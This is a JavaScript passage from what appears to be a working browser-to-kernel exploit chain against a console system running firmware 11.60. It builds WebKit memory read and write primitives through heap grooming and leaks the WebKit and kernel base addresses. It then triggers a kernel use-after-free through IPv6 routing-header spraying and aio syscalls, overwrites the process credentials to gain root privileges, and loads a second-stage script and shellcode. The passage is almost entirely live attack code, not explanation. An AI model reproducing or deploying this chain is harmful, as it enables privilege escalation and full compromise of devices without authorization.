        const IPV6_RTHDR = 51;
        const NUM_SPRAYS = 0x100;
        const RTHDR_SIZE = 0x80;

        function new_socket() {
            const sd = window.syscall(window.SYSCALL.socket, AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
            if (sd === 0xffffffffffffffffn) throw new Error('socket failed');
            return sd;
        }

        const master_sock = new_socket();
        const victim_sock = new_socket();
        const spray_socks = [];
        for (let i = 0; i < NUM_SPRAYS; i++) spray_socks.push(new_socket());

        function build_rthdr(buf, len) {
            const l = ((Number(len) >> 3) - 1) & ~1;
            const actual = (l + 1) << 3;
            window.write8(buf, 0n);
            window.write8(buf + 1n, BigInt(l));
            window.write8(buf + 2n, 0n);
            window.write8(buf + 3n, BigInt(l >> 1));
            return actual;
        }

        const spray_buf = window.malloc(RTHDR_SIZE);
        const rsize = build_rthdr(spray_buf, RTHDR_SIZE);
        for (let i = 0; i < RTHDR_SIZE; i++) window.write8(spray_buf + BigInt(i), BigInt(i & 0xff));
        for (const sd of spray_socks) {
            window.syscall(window.SYSCALL.setsockopt, sd, IPPROTO_IPV6, IPV6_RTHDR, spray_buf, rsize);
        }

        const kq = window.syscall(window.SYSCALL.kqueue);
        if (kq === 0xffffffffffffffffn) throw new Error('kqueue failed');
        const reqs = window.malloc(0x28);
        window.write32(reqs + 0x20n, victim_sock);
        const ids = window.malloc(4);
        const cmd = 0x1001n;
        if (window.syscall(window.SYSCALL.aio_submit_cmd, cmd, reqs, 1n, 3n, ids) !== 0n) {
            throw new Error('aio_submit_cmd failed');
        }

        // Trigger UAF
        window.syscall(window.SYSCALL.close, victim_sock);
        const kev = window.malloc(0x10);
        window.write64(kev, 0n);
        window.write64(kev + 8n, 0n);
        window.syscall(window.SYSCALL.kevent, kq, kev, 1n, 0n, 0n, 0n);
        const errors = window.malloc(4);
        window.syscall(window.SYSCALL.aio_multi_delete, ids, 1n, errors);
        window.syscall(window.SYSCALL.close, master_sock);

        const curproc = findCurproc();
        if (curproc === 0n) { mark('POOPS-CURPROC-FAIL'); return; }
        const ucred = window.read64(curproc + 0x40n);
        if (ucred === 0n) { mark('POOPS-UCRED-FAIL'); return; }
        window.write_dword(ucred + 0x04n, 0n);
        window.write_dword(ucred + 0x08n, 0n);
        window.write_dword(ucred + 0x0Cn, 0n);
        window.write_qword(ucred + 0x58n, 0x4800000000000007n);
        window.write_qword(ucred + 0x60n, 0xffffffffffffffffn);
        window.write_qword(ucred + 0x68n, 0xffffffffffffffffn);

        mark('POOPS-PRIV-ESCALATED', 'ucred patched via UAF');

        const [master_read, master_write] = window.create_pipe();
        const [victim_read, victim_write] = window.create_pipe();
        window.syscall(window.SYSCALL.fcntl, master_read, 4n, 4n);
        window.syscall(window.SYSCALL.fcntl, master_write, 4n, 4n);
        window.syscall(window.SYSCALL.fcntl, victim_read, 4n, 4n);
        window.syscall(window.SYSCALL.fcntl, victim_write, 4n, 4n);

        if (typeof window.load_aioshellcode === 'function') {
            await window.load_aioshellcode(curproc, [master_read, master_write], [victim_read, victim_write]);
        } else {
            mark('LOAD-AIOSHELLCODE-MISSING', 'function not available');
        }
        mark('POOPS-DONE', 'ported poops chain completed');
    }

    // ============================================================
    // 4. SECOND STAGE
    // ============================================================
    function loadSecondStage() {
        if (!window.SYSCALL) {
            window.SYSCALL = {
                getpid: 20n,
                fcntl: 92n,
                pipe: 42n,
                socket: 97n,
                setsockopt: 105n,
                getsockopt: 118n,
                close: 6n,
                kqueue: 22n,
                kevent: 23n,
                aio_submit_cmd: 0x29dn,
                aio_multi_delete: 0x296n,
            };
        }
        if (typeof window.load_aioshellcode === 'undefined') {
            mark('SECOND-STAGE', 'loading lapse-runtime.js');
            var script = document.createElement('script');
            script.src = 'lapse-runtime.js?t=' + Date.now();
            script.onload = function() {
                mark('RUNTIME-LOADED', 'lapse-runtime.js loaded');
                runPoops().catch(e => mark('POOPS-ERROR', e.message));
            };
            script.onerror = function() {
                mark('RUNTIME-LOAD-FAIL', 'could not load lapse-runtime.js');
                if (window.ipv6_kernel_rw) {
                    doInjectionFallback();
                }
            };
            document.head.appendChild(script);
        } else {
            runPoops().catch(e => mark('POOPS-ERROR', e.message));
        }
    }

    function doInjectionFallback() {
        mark('FALLBACK', 'using ipv6_kernel_rw');
        const curproc = findCurproc();
        if (curproc === 0n) { mark('FALLBACK-CURPROC-FAIL'); return; }
        const proc_fd = window.read64(curproc + 0x48n);
        const curproc_ofiles = proc_fd + 0x0n;
        function kread8(addr) { return window.read64(addr); }
        function restricted_kwrite8(addr, val) { window.write64(addr, val); }
        try {
            window.ipv6_kernel_rw.init(curproc_ofiles, kread8, restricted_kwrite8);
            mark('IPV6-INIT-OK', 'kernel R/W initialized');
            const ucred = window.kernel.read_qword(curproc + 0x40n);
            window.kernel.write_dword(ucred + 0x04n, 0n);
            window.kernel.write_qword(ucred + 0x58n, 0x4800000000000007n);
            window.kernel.write_qword(ucred + 0x60n, 0xffffffffffffffffn);
            window.kernel.write_qword(ucred + 0x68n, 0xffffffffffffffffn);
            mark('PRIV-ESCALATED', 'ucred patched via fallback');
            const [master_read, master_write] = window.create_pipe();
            const [victim_read, victim_write] = window.create_pipe();
            window.syscall(window.SYSCALL.fcntl, master_read, 4n, 4n);
            window.syscall(window.SYSCALL.fcntl, master_write, 4n, 4n);
            window.syscall(window.SYSCALL.fcntl, victim_read, 4n, 4n);
            window.syscall(window.SYSCALL.fcntl, victim_write, 4n, 4n);
            window.load_aioshellcode(curproc, [master_read, master_write], [victim_read, victim_write])
                .then(() => mark('PAYLOAD-LOADED', 'fallback completed'));
        } catch (e) {
            mark('FALLBACK-ERROR', e.message);
        }
    }

    // ============================================================
    // 5. REPORT COMPOSITION (triggers second stage)
    // ============================================================
    function reportComposition() {
        if (compositionState < 0) {
            mark(retrySafe ? 'SSV-PLACEMENT-MISS' : 'LOAD-THREW',
                (compositionError && compositionError.name) + ':' + String(compositionError && compositionError.message).slice(0,80));
            mark('DONE-THROW', 'predecessor-cleared=true');
            if (!retrySafe) {
                try { sessionStorage.setItem(REVISION + ':blocked', '1'); } catch (_) {}
            }
            setTimeout(function () { mark('SURVIVED-THROW-T1000'); }, 1000);
            return;
        }
        if (compositionState === 2) {
            mark('NORMAL-CLONE-MISS', 'known-reference-returned=true');
            mark('DONE-MISS', 'predecessor-cleared=true');
            setTimeout(function () { mark('SURVIVED-MISS-T1000'); }, 1000);
            return;
        }
        if (compositionState === 3) {
            mark('HEADER-MISMATCH', 'rw=' + rwHeaderOK + '-target=' + targetHeaderOK + '-carrier-restored=true');
            mark('RW-HEADER-HEX', dumpHex(rwHeader));
            mark('TARGET-HEADER-HEX', dumpHex(targetHeader));
            if (!retrySafe) {
                try { sessionStorage.setItem(REVISION + ':blocked', '1'); } catch (_) {}
            }
            setTimeout(function () { mark('SURVIVED-MISMATCH-T1000'); }, 1000);
            return;
        }
        if (compositionState === 0) { mark('NO-RESULT', 'critical-load-did-not-finish'); return; }

        mark('SSV-RETURNED-CLEARED', 'length=' + compositionLength + '-predecessor-cleared=true');
        mark('RW-CARRIER', 'sid=' + hex(uint32At(rwHeader,0)) + '-vector=' + hex(rwOriginalVector) + '-length=0x100-mode=0x' + rwHeader[0x28].toString(16));
        mark('TARGET-CELL', 'P=' + hex(targetAddress) + '-sid=' + hex(uint32At(targetHeader,0)) + '-vector=' + hex(targetVector) + '-length=0x20-mode=0x' + targetHeader[0x28].toString(16));
        mark('RW-HEADER-HEX', dumpHex(rwHeader));
        mark('TARGET-HEADER-HEX', dumpHex(targetHeader));

        var readPass = rwHeaderOK && targetHeaderOK && readObserved && compositionLength === EXPECTED_LENGTH;
        var writePass = writeObserved && restoreObserved;
        try { sessionStorage.setItem(REVISION + ':blocked', '1'); } catch (_) {}
        if (readPass) mark('ARBITRARY-READ-PASS', 'target=owned-live-cell-and-backing');
        else mark('ARBITRARY-READ-MISMATCH', 'rw-header=' + rwHeaderOK + '-target-header=' + targetHeaderOK + '-observed=' + readObserved + '-clone-length=' + (compositionLength === EXPECTED_LENGTH));
        if (writePass) mark('ARBITRARY-WRITE-PASS', 'a5-to-5a-to-a5-restored=true');
        else mark('ARBITRARY-WRITE-MISMATCH', 'write=' + writeObserved + '-restore=' + restoreObserved);

        if (readPass && writePass) {
            mark('GENUINE-U8-RW-PASS', 'carrier-vector-restored=true');
            try { sessionStorage.setItem(REVISION + ':passed', '1'); } catch (_) {}
            arwReady = true;
        }
        mark('ROOTS-LIVE', 'rw-byte=' + rwView[0].toString(16) + '-target-byte=' + targetView[0].toString(16) + '-length-word=' + lengthWord.keep.toString(16));
        setTimeout(function () { mark('SURVIVED-T100'); }, 100);
        setTimeout(function () { mark('SURVIVED-T1000'); }, 1000);
        setTimeout(function () { mark('SURVIVED-T3000'); }, 3000);

        if (arwReady && !window._secondStageStarted) {
            window._secondStageStarted = true;
            fetch('offsets.json', { cache: 'no-store' })
                .then(function (r) { return r.json(); })
                .then(function (data) {
                    var fw = '11.60';
                    offsets = data[fw];
                    if (!offsets) {
                        var near = null, bestd = 1e9;
                        for (var k in data) {
                            var d = Math.abs(parseInt(k.split('.')[0])*100 + parseInt(k.split('.')[1]) - 1160);
                            if (d < bestd) { bestd = d; near = k; }
                        }
                        offsets = data[near];
                    }
                    if (!offsets) { mark('OFFSETS-FAIL', 'no offsets for 11.60'); return; }
                    mark('OFFSETS-LOADED', 'using ' + (near || '11.60'));
                    if (leakBases()) {
                        mark('BASES-LEAKED', 'webkit=' + hex(webkitBase) + ' kernel=' + hex(kernelBase));
                        loadSecondStage();
                    } else {
                        mark('BASE-LEAK-FAIL', 'could not leak bases');
                    }
                })
                .catch(function () { mark('OFFSETS-FETCH-FAIL', 'could not fetch offsets.json'); });
        }
    }

    // ============================================================
    // 6. BEGIN COMPOSITION
    // ============================================================
    function beginComposition() {
        if (captureState === 0) {
            mark('ADDROF-NO-RESULT', 'capture-task-did-not-finish');
            return;
        }
        if (captureState < 0) {
            mark('ADDROF-THREW', (captureError && captureError.name) + ':' + String(captureError && captureError.message).slice(0,80));
            return;
        }

        var a0 = pointerFromWords(capturedWords, 0);
        var b0 = pointerFromWords(capturedWords, 4);
        var a1 = pointerFromWords(capturedWords, 8);
        var b1 = pointerFromWords(capturedWords, 12);
        var repeated = a0 === a1 && b0 === b1;
        var distinct = a0 !== b0;
        var plausible = plausibleCell(a0) && plausibleCell(b0) && plausibleCell(a1) && plausibleCell(b1);
        var fakeChars = copiedLength >= 8 ? copiedLength - 8 : 0;
        var sourceCovered = fakeChars * 2 <= CARRIER_BYTES;

        mark('ADDROF-RETURNED', REVISION);
        mark('ADDROF-COPY', 'chars=' + copiedLength + '-source-covered=' + sourceCovered);
        mark('ADDROF-POINTERS', 'HOST=' + hex(a0) + '-TARGET=' + hex(b0) + '-HOST2=' + hex(a1) + '-TARGET2=' + hex(b1));

        if (!(repeated && distinct && plausible && sourceCovered)) {
            mark('ADDROF-FAIL', 'repeat=' + repeated + '-distinct=' + distinct + '-plausible=' + plausible + '-covered=' + sourceCovered);
            return;
        }

        hostAddress = a0;
        targetAddress = b0;
        targetAddressHigh = Math.floor(targetAddress / 0x100000000);
        targetAddressLow = targetAddress - targetAddressHigh * 0x100000000;
        if (targetAddressHigh < 0 || targetAddressHigh > 0xffff || targetAddressLow < 0 || targetAddressLow > 0xffffffff || Math.floor(targetAddressLow) !== targetAddressLow || targetAddressLow + targetAddressHigh * 0x100000000 !== targetAddress) {
            mark('TARGET-ADDRESS-FAIL', 'target=' + hex(targetAddress));
            return;
        }
        fakeAddress = hostAddress + 0x10;
        if (!plausibleCell(fakeAddress) || fakeAddress - hostAddress !== 0x10) {
            mark('FAKE-ADDRESS-FAIL', 'host=' + hex(hostAddress));
            return;
        }
        mark('FAKE-ADDRESS', 'host=' + hex(hostAddress) + '-fake=' + hex(fakeAddress) + '-delta=0x10');
        runGroomAndLoad();
    }

    function runGroomAndLoad() {
        try {
            mark('SSV-GROOM-ENTER', 'n=' + DRAIN_COUNT);
            var channel = new MessageChannel();
            channel.port1.close(); channel.port2.close();
            for (var i = 0; i < DRAIN_COUNT; ++i) keepAlive[keepIndex++] = buffer(DRAIN_SIZE);
            var slab = buffer(SLAB_SIZE); channel.port1.postMessage(0, [slab]); slab = null;
            var butterflyHole1 = buffer(BUTTERFLY_HOLE_SIZE);
            var butterflyHole2 = buffer(BUTTERFLY_HOLE_SIZE);
            var separator = buffer(SEPARATOR_SIZE);
            var earlyHole = buffer(EARLY_HOLE_SIZE);
            var guard = buffer(GUARD_SIZE);
            var predecessor = buffer(PREDECESSOR_SIZE);
            var finalHole = buffer(FINAL_HOLE_SIZE);
            fillRawCellPointers(predecessor, fakeAddress);
            keepAlive[keepIndex++] = separator;
            keepAlive[keepIndex++] = guard;
            keepAlive[keepIndex++] = predecessor;
            mark('PREDECESSOR-FILLED', 'qwords=' + (PREDECESSOR_SIZE / 8) + '-fake=' + hex(fakeAddress));
            channel.port1.postMessage(0, [butterflyHole1, butterflyHole2, earlyHole, finalHole]);
            loadHistoryCritical();
        } catch (error) {
            try { clearPredecessor(); } catch (_) {}
            compositionError = error;
            compositionState = -1;
        }
        reportComposition();
    }

    // ============================================================
    // 7. BOOT
    // ============================================================
    var allowAgain = /(?:^|[?&])again=1(?:&|$)/.test(location.search);
    allowAgain = true;
    var attemptKey = REVISION + ':attempts';
    var passKey = REVISION + ':passed';
    var blockKey = REVISION + ':blocked';
    var priorAttempts = 0, alreadyPassed = false, alreadyBlocked = false;
    try {
        priorAttempts = parseInt(sessionStorage.getItem(attemptKey) || '0', 10);
        if (!isFinite(priorAttempts) || priorAttempts < 0) priorAttempts = 0;
        alreadyPassed = sessionStorage.getItem(passKey) === '1';
        alreadyBlocked = sessionStorage.getItem(blockKey) === '1';
    } catch (_) {}
    attemptNumber = priorAttempts + 1;

    mark('BOOT', 'rev=' + REVISION + '-k=' + K + '-n=' + DRAIN_COUNT + '-attempt=' + attemptNumber + '-max=' + MAX_ATTEMPTS);

    if (alreadyPassed && !allowAgain) {
        mark('PASS-ALREADY-BLOCKED', 'no-more-runs-needed');
    } else if (alreadyBlocked && !allowAgain) {
        mark('CANDIDATE-RETURNED-BLOCKED', 'manual-review-required');
    } else if (priorAttempts >= MAX_ATTEMPTS && !allowAgain) {
        mark('RETRY-LIMIT', 'max=' + MAX_ATTEMPTS + '-no-more-runs');
    } else if (typeof BigInt !== 'function' || typeof MessageChannel !== 'function' || typeof Symbol !== 'function' || typeof history === 'undefined' || typeof history.replaceState !== 'function') {
        mark('UNSUPPORTED');
    } else {
        try { sessionStorage.setItem(attemptKey, String(attemptNumber)); } catch (_) {}
        try {
            buildAndStoreGraph();
            prepareAddrof();
        } catch (error) {
            mark('SETUP-THREW', (error && error.name) + ':' + String(error && error.message).slice(0,80));
        }
    }
}
</script>
